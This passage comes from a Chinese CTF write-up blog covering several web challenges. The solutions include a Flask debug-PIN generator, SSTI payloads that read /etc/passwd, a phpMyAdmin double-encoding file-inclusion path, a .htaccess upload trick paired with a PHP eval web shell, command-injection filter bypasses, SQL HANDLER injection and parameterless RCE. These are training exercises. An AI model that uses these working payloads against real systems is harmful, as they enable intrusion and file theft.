            rv <span class="token operator">=</span> <span class="token string">'-'</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>num<span class="token punctuation">[</span>x<span class="token punctuation">:</span>x <span class="token operator">+</span> group_size<span class="token punctuation">]</span><span class="token punctuation">.</span>rjust<span class="token punctuation">(</span>group_size<span class="token punctuation">,</span> <span class="token string">'0'</span><span class="token punctuation">)</span> <span class="token keyword">for</span> x <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> len<span class="token punctuation">(</span>num<span class="token punctuation">)</span><span class="token punctuation">,</span> group_size<span class="token punctuation">)</span><span class="token punctuation">)</span>
            <span class="token keyword">break</span>
    <span class="token keyword">else</span><span class="token punctuation">:</span>
        rv <span class="token operator">=</span> num

<span class="token keyword">print</span><span class="token punctuation">(</span>rv<span class="token punctuation">)</span>
</code></pre>
<p>336-610-602输入到/console中即可命令执行</p>
<p>也可以直接目录穿越获取flag</p>
<pre><code>http://111.200.241.244:49355/asserts/..%2f..%2f..%2f..%2f/flag.txt</code></pre>
<h1 id="GYCTF2020：FlaskApp"><a href="#GYCTF2020：FlaskApp" class="headerlink" title="GYCTF2020：FlaskApp"></a>GYCTF2020：FlaskApp</h1><p>常规的SSTI解法之前写过了</p>
<pre class=" language-python"><code class="language-python"><span class="token punctuation">{</span><span class="token punctuation">{</span><span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__mro__<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">102</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__init__<span class="token punctuation">.</span>__globals__<span class="token punctuation">[</span><span class="token string">'open'</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token string">'/etc/passwd'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre>
<pre class=" language-python"><code class="language-python"><span class="token punctuation">{</span><span class="token punctuation">{</span><span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__mro__<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">102</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__init__<span class="token punctuation">.</span>__globals__<span class="token punctuation">[</span><span class="token string">'open'</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token string">'/proc/self/cgroup'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre>
<p>脚本：</p>
<pre class=" language-Python"><code class="language-Python">import hashlib
from itertools import chain
probably_public_bits = [
    'flaskweb'# username
    'flask.app',# modname
    'Flask',# getattr(app, '__name__', getattr(app.__class__, '__name__'))
    '/usr/local/lib/python3.7/site-packages/flask/app.py' # getattr(mod, '__file__', None),
]

private_bits = [
    '2485377957894',# str(uuid.getnode()),  /sys/class/net/ens33/address
    '3c7c60af8484830ab0b1e9615fada4e74d93a8a111baa4afcd949feeab56c320'# get_machine_id(), /etc/machine-id
]

h = hashlib.md5()
for bit in chain(probably_public_bits, private_bits):
    if not bit:
        continue
    if isinstance(bit, str):
        bit = bit.encode('utf-8')
    h.update(bit)
h.update(b'cookiesalt')

cookie_name = '__wzd' + h.hexdigest()[:20]

num = None
if num is None:
    h.update(b'pinsalt')
    num = ('%09d' % int(h.hexdigest(), 16))[:9]

rv =None
if rv is None:
    for group_size in 5, 4, 3:
        if len(num) % group_size == 0:
            rv = '-'.join(num[x:x + group_size].rjust(group_size, '0')
                          for x in range(0, len(num), group_size))
            break
    else:
        rv = num

print(rv)
</code></pre>
<h1 id="链接参考："><a href="#链接参考：" class="headerlink" title="链接参考："></a>链接参考：</h1><p><a href="https://blog.csdn.net/weixin_44604541/article/details/109147735">https://blog.csdn.net/weixin_44604541/article/details/109147735</a></p>
<p><a href="https://www.cnblogs.com/HacTF/p/8160076.html">https://www.cnblogs.com/HacTF/p/8160076.html</a></p>
<p><a href="https://xz.aliyun.com/t/2553">https://xz.aliyun.com/t/2553</a></p>
]]></content>
      <tags>
        <tag>Flask debug PIN</tag>
      </tags>
  </entry>
  <entry>
    <title>GKCTF：2021-蝉知cms</title>
    <url>/2021/10/01/gkctf-2021-chan-zhi-cms/</url>
    <content><![CDATA[<p>提示后台弱口令</p>
<pre><code>admin 12345</code></pre>
<p><img src="/2021/10/01/gkctf-2021-chan-zhi-cms/image-20211001162552187.png" alt="image-20211001162552187"></p>
<p>百度搜索蝉知7.7+漏洞发现命令执行,直接打</p>
<p>登录后台：</p>
<p><img src="/2021/10/01/gkctf-2021-chan-zhi-cms/image-20211001162715047.png" alt="image-20211001162715047"></p>
<p>请在服务器创建 /var/www/html/system/tmp/erjn.txt 文件</p>
<p>设置-&gt;微信设置</p>
<p><img src="/2021/10/01/gkctf-2021-chan-zhi-cms/image-20211001162812048.png" alt="image-20211001162812048"></p>
<p><img src="/2021/10/01/gkctf-2021-chan-zhi-cms/image-20211001162856369.png" alt="image-20211001162856369"></p>
<p>这里就可以成功保存</p>
<p><img src="/2021/10/01/gkctf-2021-chan-zhi-cms/image-20211001163635564.png" alt="image-20211001163635564"></p>
<pre><code>http://9eed68a6-b18e-4dcc-a17b-cf404855fb80.node4.buuoj.cn:81/www/</code></pre>
<p><img src="/2021/10/01/gkctf-2021-chan-zhi-cms/image-20211001163740176.png" alt="image-20211001163740176"></p>
]]></content>
      <tags>
        <tag>cms</tag>
      </tags>
  </entry>
  <entry>
    <title>GWCTF:2019-我有一个数据库</title>
    <url>/2021/06/20/gwctf-2019-wo-you-yi-ge-shu-ju-ku/</url>
    <content><![CDATA[<p><img src="/2021/06/20/gwctf-2019-wo-you-yi-ge-shu-ju-ku/image-20210620144400661.png" alt="image-20210620144400661"></p>
<p>御剑扫描进入/phpmyadmin/</p>
<p><img src="/2021/06/20/gwctf-2019-wo-you-yi-ge-shu-ju-ku/image-20210620144454591.png" alt="image-20210620144454591"></p>
<p>没什么可以利用的查看了<strong>PHP版本4.8.1</strong>百度版本漏洞：</p>
<pre class=" language-php"><code class="language-php"><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span> <span class="token function">empty</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string">'target'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">//检测非空</span>
    <span class="token operator">&amp;&amp;</span> <span class="token function">is_string</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string">'target'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">//检测字符串</span>
    <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span> <span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/^index/'</span><span class="token punctuation">,</span> <span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string">'target'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">//过滤index</span>
    <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span> <span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string">'target'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$target_blacklist</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">//过滤黑名单</span>
    <span class="token operator">&amp;&amp;</span> Core<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token function">checkPageValidity</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string">'target'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">//调用Core::checkPageValidity</span>
<span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">include</span> <span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string">'target'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    exit<span class="token punctuation">;</span>
<span class="token punctuation">}</span></code></pre>
<p>blacklist:</p>
<pre class=" language-php"><code class="language-php"><span class="token variable">$target_blacklist</span> <span class="token operator">=</span> <span class="token keyword">array</span> <span class="token punctuation">(</span>
    <span class="token string">'import.php'</span><span class="token punctuation">,</span> <span class="token string">'export.php'</span>
<span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre>
<p>Core::checkPageValidity($_REQUEST[‘target’]):</p>
<pre class=" language-php"><code class="language-php"> <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">function</span> <span class="token function">checkPageValidity</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token variable">$page</span><span class="token punctuation">,</span> <span class="token keyword">array</span> <span class="token variable">$whitelist</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">empty</span><span class="token punctuation">(</span><span class="token variable">$whitelist</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token variable">$whitelist</span> <span class="token operator">=</span> self<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token variable">$goto_whitelist</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span> <span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$page</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token operator">!</span><span class="token function">is_string</span><span class="token punctuation">(</span><span class="token variable">$page</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>   <span class="token comment" spellcheck="true">//检测变量和字符</span>
            <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>

        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$page</span><span class="token punctuation">,</span> <span class="token variable">$whitelist</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token comment" spellcheck="true">//在whilelist里搜索$page</span>
            <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>

        <span class="token variable">$_page</span> <span class="token operator">=</span> <span class="token function">mb_substr</span><span class="token punctuation">(</span>
            <span class="token variable">$page</span><span class="token punctuation">,</span>
            <span class="token number">0</span><span class="token punctuation">,</span>
            <span class="token function">mb_strpos</span><span class="token punctuation">(</span><span class="token variable">$page</span> <span class="token punctuation">.</span> <span class="token string">'?'</span><span class="token punctuation">,</span> <span class="token string">'?'</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">//查找?在$page中首次出现位置</span>
        <span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$_page</span><span class="token punctuation">,</span> <span class="token variable">$whitelist</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>

        <span class="token variable">$_page</span> <span class="token operator">=</span> <span class="token function">urldecode</span><span class="token punctuation">(</span><span class="token variable">$page</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token variable">$_page</span> <span class="token operator">=</span> <span class="token function">mb_substr</span><span class="token punctuation">(</span>
            <span class="token variable">$_page</span><span class="token punctuation">,</span>
            <span class="token number">0</span><span class="token punctuation">,</span>
            <span class="token function">mb_strpos</span><span class="token punctuation">(</span><span class="token variable">$_page</span> <span class="token punctuation">.</span> <span class="token string">'?'</span><span class="token punctuation">,</span> <span class="token string">'?'</span><span class="token punctuation">)</span>
        <span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$_page</span><span class="token punctuation">,</span> <span class="token variable">$whitelist</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>

        <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span></code></pre>
<p>urldecode($page)方法，存在二次编码绕过</p>
<ul>
<li>%25的url编码为%</li>
<li>%3f的url编码为?</li>
<li>%253f–&gt;?</li>
</ul>
<p>验证白名单：</p>
<pre class=" language-php"><code class="language-php"><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token variable">$goto_whitelist</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span>
        <span class="token string">'db_datadict.php'</span><span class="token punctuation">,</span>
        <span class="token string">'db_sql.php'</span><span class="token punctuation">,</span>
        <span class="token string">'db_events.php'</span><span class="token punctuation">,</span>
        <span class="token string">'db_export.php'</span><span class="token punctuation">,</span>
        <span class="token string">'db_importdocsql.php'</span><span class="token punctuation">,</span>
        <span class="token string">'db_multi_table_query.php'</span><span class="token punctuation">,</span>
        <span class="token string">'db_structure.php'</span><span class="token punctuation">,</span>
        <span class="token string">'db_import.php'</span><span class="token punctuation">,</span>
        <span class="token string">'db_operations.php'</span><span class="token punctuation">,</span>
        <span class="token string">'db_search.php'</span><span class="token punctuation">,</span>
        <span class="token string">'db_routines.php'</span><span class="token punctuation">,</span>
        <span class="token string">'export.php'</span><span class="token punctuation">,</span>
        <span class="token string">'import.php'</span><span class="token punctuation">,</span>
        <span class="token string">'index.php'</span><span class="token punctuation">,</span>
        <span class="token string">'pdf_pages.php'</span><span class="token punctuation">,</span>
        <span class="token string">'pdf_schema.php'</span><span class="token punctuation">,</span>
        <span class="token string">'server_binlog.php'</span><span class="token punctuation">,</span>
        <span class="token string">'server_collations.php'</span><span class="token punctuation">,</span>
        <span class="token string">'server_databases.php'</span><span class="token punctuation">,</span>
        <span class="token string">'server_engines.php'</span><span class="token punctuation">,</span>
        <span class="token string">'server_export.php'</span><span class="token punctuation">,</span>
        <span class="token string">'server_import.php'</span><span class="token punctuation">,</span>
        <span class="token string">'server_privileges.php'</span><span class="token punctuation">,</span>
        <span class="token string">'server_sql.php'</span><span class="token punctuation">,</span>
        <span class="token string">'server_status.php'</span><span class="token punctuation">,</span>
        <span class="token string">'server_status_advisor.php'</span><span class="token punctuation">,</span>
        <span class="token string">'server_status_monitor.php'</span><span class="token punctuation">,</span>
        <span class="token string">'server_status_queries.php'</span><span class="token punctuation">,</span>
        <span class="token string">'server_status_variables.php'</span><span class="token punctuation">,</span>
        <span class="token string">'server_variables.php'</span><span class="token punctuation">,</span>
        <span class="token string">'sql.php'</span><span class="token punctuation">,</span>
        <span class="token string">'tbl_addfield.php'</span><span class="token punctuation">,</span>
        <span class="token string">'tbl_change.php'</span><span class="token punctuation">,</span>
        <span class="token string">'tbl_create.php'</span><span class="token punctuation">,</span>
        <span class="token string">'tbl_import.php'</span><span class="token punctuation">,</span>
        <span class="token string">'tbl_indexes.php'</span><span class="token punctuation">,</span>
        <span class="token string">'tbl_sql.php'</span><span class="token punctuation">,</span>
        <span class="token string">'tbl_export.php'</span><span class="token punctuation">,</span>
        <span class="token string">'tbl_operations.php'</span><span class="token punctuation">,</span>
        <span class="token string">'tbl_structure.php'</span><span class="token punctuation">,</span>
        <span class="token string">'tbl_relation.php'</span><span class="token punctuation">,</span>
        <span class="token string">'tbl_replace.php'</span><span class="token punctuation">,</span>
        <span class="token string">'tbl_row_action.php'</span><span class="token punctuation">,</span>
        <span class="token string">'tbl_select.php'</span><span class="token punctuation">,</span>
        <span class="token string">'tbl_zoom_select.php'</span><span class="token punctuation">,</span>
        <span class="token string">'transformation_overview.php'</span><span class="token punctuation">,</span>
        <span class="token string">'transformation_wrapper.php'</span><span class="token punctuation">,</span>
        <span class="token string">'user_password.php'</span><span class="token punctuation">,</span>
    <span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre>
<p>直接利用结果：</p>
<pre class=" language-php"><code class="language-php">target<span class="token operator">=</span>db_sql<span class="token punctuation">.</span>php<span class="token operator">%</span>253f<span class="token operator">/</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">/</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">/</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">/</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">/</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">/</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">/</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">/</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">/</span>etc<span class="token operator">/</span>passwd</code></pre>
<p><img src="/2021/06/20/gwctf-2019-wo-you-yi-ge-shu-ju-ku/image-20210620145954227.png" alt="image-20210620145954227"></p>
<p>flag应该在根目录下</p>
<pre><code>target=db_sql.php%253f/../../../../../../../../flag</code></pre>
]]></content>
  </entry>
  <entry>
    <title>GXYCTF:2019-BabyUpload</title>
    <url>/2021/06/16/gxyctf-2019-babyupload/</url>
    <content><![CDATA[<p>apache</p>
<p>上传.htaccess</p>
<pre><code>&lt;FilesMatch "1"&gt;
SetHandler application/x-httpd-php
&lt;/FilesMatch&gt;</code></pre>
<pre><code>Content-Type: image/jpeg</code></pre>
<pre><code>/var/www/html/upload/7f7b1f9e52adf7726727d061cd3fa94c/.htaccess succesfully uploaded!</code></pre>
<p>上传1.jpg</p>
<pre><code>GIF89a?
&lt;script language="php"&gt;eval($_POST[1]);&lt;/script&gt;
</code></pre>
<pre><code>/var/www/html/upload/7f7b1f9e52adf7726727d061cd3fa94c/1.jpg succesfully uploaded!</code></pre>
<p>蚁剑连接</p>
<p>d9db5681-3d2b-4655-b8f3-4bc989481944.node3.buuoj.cn/upload/7f7b1f9e52adf7726727d061cd3fa94c/1.jpg</p>
<p>虚拟终端cat /flag</p>
<p><img src="/2021/06/16/gxyctf-2019-babyupload/image-20210616215125367.png" alt="image-20210616215125367"></p>
<pre><code>flag{eda5bdce-0717-49c9-9fdf-e8289d3baed6}</code></pre>
]]></content>
      <tags>
        <tag>文件上传</tag>
      </tags>
  </entry>
  <entry>
    <title>GXYCTF：2019-StrongestMind</title>
    <url>/2021/09/18/gxyctf-2019-strongestmind/</url>
    <content><![CDATA[<p><img src="/2021/09/18/gxyctf-2019-strongestmind/image-20210918205216019.png" alt="image-20210918205216019"></p>
<p>用脚本把它跑出来</p>
<pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> re
<span class="token keyword">import</span> requests
<span class="token keyword">from</span> time <span class="token keyword">import</span> sleep


<span class="token keyword">def</span> <span class="token function">count</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    s <span class="token operator">=</span> requests<span class="token punctuation">.</span>session<span class="token punctuation">(</span><span class="token punctuation">)</span>
    url <span class="token operator">=</span> <span class="token string">'http://5c04e4f0-712d-4693-b7ab-cdf6559f2ecd.node4.buuoj.cn:81//'</span>
    match <span class="token operator">=</span> re<span class="token punctuation">.</span>compile<span class="token punctuation">(</span>r<span class="token string">"[0-9]+ [+|-] [0-9]+"</span><span class="token punctuation">)</span>
    r <span class="token operator">=</span> s<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">)</span>
    <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">1001</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        sleep<span class="token punctuation">(</span><span class="token number">0.1</span><span class="token punctuation">)</span>
        str <span class="token operator">=</span> match<span class="token punctuation">.</span>findall<span class="token punctuation">(</span>r<span class="token punctuation">.</span>text<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>
        <span class="token comment" spellcheck="true"># print(eval(str))</span>
        data <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">"answer"</span> <span class="token punctuation">:</span> eval<span class="token punctuation">(</span>str<span class="token punctuation">)</span><span class="token punctuation">}</span>
        r <span class="token operator">=</span> s<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">)</span>
        r<span class="token punctuation">.</span>encoding <span class="token operator">=</span> <span class="token string">"utf-8"</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'{} : {}'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>i<span class="token punctuation">,</span>eval<span class="token punctuation">(</span>str<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        <span class="token comment" spellcheck="true"># print(r.text)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>text<span class="token punctuation">)</span>



<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>
    count<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre>
]]></content>
  </entry>
  <entry>
    <title>GXYCTF:2019-PingPingPing</title>
    <url>/2021/06/10/gxyctf-2019-pingpingping/</url>
    <content><![CDATA[<p><img src="/2021/06/10/gxyctf-2019-pingpingping/image-20210610215732594.png" alt="image-20210610215732594"></p>
<pre><code>/?ip=127.0.0.1;cat /flag</code></pre>
<p><img src="/2021/06/10/gxyctf-2019-pingpingping/image-20210610215809393.png" alt="image-20210610215809393"></p>
<pre><code>/?ip=127.0.0.1;ls</code></pre>
<p><img src="/2021/06/10/gxyctf-2019-pingpingping/image-20210610215833127.png" alt="image-20210610215833127"></p>
<pre><code>/?ip=127.0.0.1;cat$IFS$1index.php</code></pre>
<p><img src="/2021/06/10/gxyctf-2019-pingpingping/image-20210610220021619.png" alt="image-20210610220021619"></p>
<h3 id="sh，bash下编码"><a href="#sh，bash下编码" class="headerlink" title="sh，bash下编码"></a>sh，bash下编码</h3><pre><code>/?ip=127.0.0.1;echo$IFS$1Y2F0IGZsYWcucGhw|base64$IFS$1-d|sh</code></pre>
<p><img src="/2021/06/10/gxyctf-2019-pingpingping/image-20210610220126890.png" alt="image-20210610220126890"></p>
<h3 id="内联执行"><a href="#内联执行" class="headerlink" title="内联执行"></a>内联执行</h3><h4 id="1-将反引号内命令的输出作为输入执行"><a href="#1-将反引号内命令的输出作为输入执行" class="headerlink" title="1.将反引号内命令的输出作为输入执行"></a>1.将反引号内命令的输出作为输入执行</h4><pre><code>?ip=127.0.0.1;cat$IFS$1`ls`</code></pre>
<p><img src="/2021/06/10/gxyctf-2019-pingpingping/image-20210610220226315.png" alt="image-20210610220226315"></p>
<h4 id="2-拼接控制参数"><a href="#2-拼接控制参数" class="headerlink" title="2.拼接控制参数"></a>2.拼接控制参数</h4><pre><code>?ip=1;a=f;d=ag;c=l;cat$IFS$a$c$d.php</code></pre>
<pre><code>?ip=127.0.0.1;a=g;cat$IFS$1fla$a.php</code></pre>
<ul>
<li><p>?ip=127.0.0.1;a=f;cat$IFS$1$alag.php    过滤</p>
</li>
<li><p>?ip=127.0.0.1;a=l;cat$IFS$1f$aag.php    有request，但没flag</p>
</li>
<li><p>?ip=127.0.0.1;a=a;cat$IFS$1fl$ag.php      过滤</p>
</li>
<li><p>?ip=127.0.0.1;a=g;cat$IFS$1fla$a.php    有flag</p>
<pre><code>if(preg_match("/.*f.*l.*a.*g.*/", $ip)){
    die("fxck your flag!");</code></pre>
</li>
</ul>
]]></content>
      <tags>
        <tag>命令执行</tag>
      </tags>
  </entry>
  <entry>
    <title>GYCTF:2020-Blacklist</title>
    <url>/2021/06/17/gyctf-2020-blacklist/</url>
    <content><![CDATA[<pre><code>1';show columns from `FlagHere`; %23  </code></pre>
<p><img src="/2021/06/17/gyctf-2020-blacklist/image-20210617211216152.png" alt="image-20210617211216152"></p>
<p>过滤了这些东西</p>
<p><img src="/2021/06/17/gyctf-2020-blacklist/image-20210617211254033.png" alt="image-20210617211254033"></p>
<p>用到handler</p>
<pre><code>HANDLER tbl_name OPEN [ [AS] alias]

HANDLER tbl_name READ index_name { = | &lt;= | &gt;= | &lt; | &gt; } (value1,value2,...)
    [ WHERE where_condition ] [LIMIT ... ]
HANDLER tbl_name READ index_name { FIRST | NEXT | PREV | LAST }
    [ WHERE where_condition ] [LIMIT ... ]
HANDLER tbl_name READ { FIRST | NEXT }
    [ WHERE where_condition ] [LIMIT ... ]

HANDLER tbl_name CLOSE 
//其中  HANDLER tbl_name OPEN AS example
//其后  HANDLER example READ index_name="example2"</code></pre>
<p>HANDLER … OPEN语句打开一个表，使其可以使用后续HANDLER … READ语句访问，该表对象未被其他会话共享，并且在会话调用HANDLER … CLOSE或会话终止之前不会关闭</p>
<pre><code>1';handler FlagHere open;handler FlagHere read first;handler FlagHere close;#</code></pre>
<p><img src="/2021/06/17/gyctf-2020-blacklist/image-20210617211413055.png" alt="image-20210617211413055"></p>
]]></content>
      <tags>
        <tag>注入</tag>
      </tags>
  </entry>
  <entry>
    <title>GXYCTF:2019-禁止套娃</title>
    <url>/2021/06/19/gxyctf-2019-jin-zhi-tao-wa/</url>
    <content><![CDATA[<h2 id="PHP-localeconv-函数"><a href="#PHP-localeconv-函数" class="headerlink" title="PHP localeconv() 函数"></a>PHP localeconv() 函数</h2><h2 id="定义和用法"><a href="#定义和用法" class="headerlink" title="定义和用法"></a>定义和用法</h2><p>localeconv() 函数返回一包含本地数字及货币格式信息的数组。</p>
<p>localeconv() 函数会返回以下数组元素：</p>
<ul>
<li><p>[decimal_point] - 小数点字符</p>
</li>
<li><p>[thousands_sep] - 千位分隔符</p>
</li>
<li><p>[int_curr_symbol] - 货币符号 （例如：USD）</p>
</li>
<li><p>[currency_symbol] - 货币符号 （例如：$）</p>
</li>
<li><p>[mon_decimal_point] - 货币小数点字符</p>
</li>
<li><p>[mon_thousands_sep] - 货币千位分隔符</p>
</li>
<li><p>[positive_sign] - 正值字符</p>
</li>
<li><p>[negative_sign] - 负值字符</p>
</li>
<li><p>[int_frac_digits] - 国际通用小数位</p>
</li>
<li><p>[frac_digits] - 本地通用小数位</p>
</li>
<li><p>[p_cs_precedes] - 如果货币符号在一个正数值之前显示，则为 True（1），如果在正数值之后显示，则为 False（0）</p>
</li>
<li><p>[p_sep_by_space] - 如果在货币符号和正数值之间包含空格，则为 True（1），否则为 False（0）</p>
</li>
<li><p>[n_cs_precedes] - 如果货币符号在一个负数值之前显示，则为 True（1），如果在负数值之后显示，则为 False（0）</p>
</li>
<li><p>[n_sep_by_space] - 如果在货币符号和负数值之间包含空格，则为 True（1），否则为 False（0）</p>
</li>
<li><p>[p_sign_posn] - 格式化选项：</p>
</li>
<li><ul>
<li>0 - 把数量和货币符号写在圆括号内</li>
<li>1 - 在数量和货币符号之前加上 + 号</li>
<li>2 - 在数量和货币符号之后加上 + 号</li>
<li>3 - 直接在货币符号之前加上 + 号</li>
<li>4 - 直接在货币符号之后加上 + 号</li>
</ul>
</li>
<li><p>[n_sign_posn] - 格式化选项：</p>
</li>
<li><ul>
<li>0 - 把数量和货币符号写在圆括号内</li>
<li>1 - 在数量和货币符号之前加上 - 号</li>
<li>2 - 在数量和货币符号之后加上 - 号</li>
<li>3 - 直接在货币符号之前加上 - 号</li>
<li>4 - 直接在货币符号之后加上 - 号</li>
</ul>
</li>
<li><p>[grouping] - 显示数字组合形式的数组（例如：3 指示 1 000 000）</p>
</li>
<li><p>[mon_grouping] - 显示货币数字组合形式的数组（例如：2 指示 1 00 00 00）</p>
</li>
</ul>
<h2 id="GXYCTF-2019-禁止套娃"><a href="#GXYCTF-2019-禁止套娃" class="headerlink" title="GXYCTF:2019-禁止套娃"></a>GXYCTF:2019-禁止套娃</h2><pre class=" language-php+HTML"><code class="language-php+HTML"><?php
include "flag.php";
echo "flag在哪里呢？<br>";
if(isset($_GET['exp'])){
    //过滤PHP伪协议
    if (!preg_match('/data:\/\/|filter:\/\/|php:\/\/|phar:\/\//i', $_GET['exp'])) {
        //过滤参数
        if(';' === preg_replace('/[a-z,_]+\((?R)?\)/', NULL, $_GET['exp'])) {
           //过滤字段
            if (!preg_match('/et|na|info|dec|bin|hex|oct|pi|log/i', $_GET['exp'])) {
                // echo $_GET['exp'];
                @eval($_GET['exp']);
            }
            else{
                die("还差一点哦！");
            }
        }
        else{
            die("再好好想想！");
        }
    }
    else{
        die("还想读flag，臭弟弟！");
    }
}
// highlight_file(__FILE__);
?></code></pre>
<p>正则过滤掉了以上这些有的没的，形成了无参数RCE</p>
<pre><code>?exp=print_r(scandir(pos(localeconv())));</code></pre>
<pre><code>?exp=print_r(scandir(current(localeconv())));</code></pre>
<p><img src="/2021/06/19/gxyctf-2019-jin-zhi-tao-wa/image-20210619205826301.png" alt="image-20210619205826301"></p>
